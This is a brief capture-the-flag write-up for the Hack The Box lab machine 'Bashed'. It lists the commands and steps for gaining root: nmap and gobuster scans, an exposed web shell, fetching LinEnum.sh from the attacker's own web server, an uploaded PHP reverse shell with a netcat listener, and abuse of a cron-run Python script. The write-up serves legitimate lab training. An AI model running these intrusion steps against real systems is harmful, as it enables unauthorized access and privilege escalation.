# Bashed
* Link: https://app.hackthebox.com/machines/Bashed
* Type: Linux
* Difficulty: Easy

## Commands Used
* *nmap -sC -sV -oA DIR IPADDRESS* - Nmap scan.
* *gobuster -u IPADDRESS -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt* - Fuzz directories
* *python3 -m SimpleHTTPServer PORTNUMBER* - Start a hosted webserver to upload things to target.
* *nc -lvnp PORTNUMBER* - Starts a listener on your machine.
* */usr/share/laudanum* - List of Shells
* *python -c 'import pty;pty.spawn("/bin/bash")'* - Runs a bash
* *sudo -u USERNAME bash* - Switch to the new user provided

## Steps
* Start by checking the open ports using nmap (nmap -sC -sV -oA DIR IPADDRESS)
* Start Fuzzing Directories (gobuster -u IPADDRESS -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt)
* Find */dev*
* In */dev* there is a shell.
* Since the server is linux, use *LinEnum.sh* to enum the linux machine.
* To upload the *LinEnum.sh* open a webserver in your linux machine (python3 -m SimpleHTTPServer PORTNUMBER).
* Then use *curl* or *wget* YOURIPADDRESS:PORTNUMBER/FILENAME to upload the file to the target.
* If permission is denied go to */dev/shm/* It's a directory that stores files in memory and not the disk so it can bypass permission denied.
* *bash LinEnum.sh* and wait for output.
* This shell is not persistent, to make it persistent use a reverse shell.
* *https://pentestmonkey.net/ is a good resource for shells.*
* Upload the reverse php shell into the uploads folder and then open it.
* use *python -c 'import pty;pty.spawn("/bin/bash")'* to run a bash.
* Use *sudo -u USERNAME bash* to switch to the scriptmanager user.
* Use test.py in the folder scripts which is run automatically every minute to run a python shell. (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* User flag is in *home/arrexel*.
* Root flag is in *root*. (Accessible using the python shell)
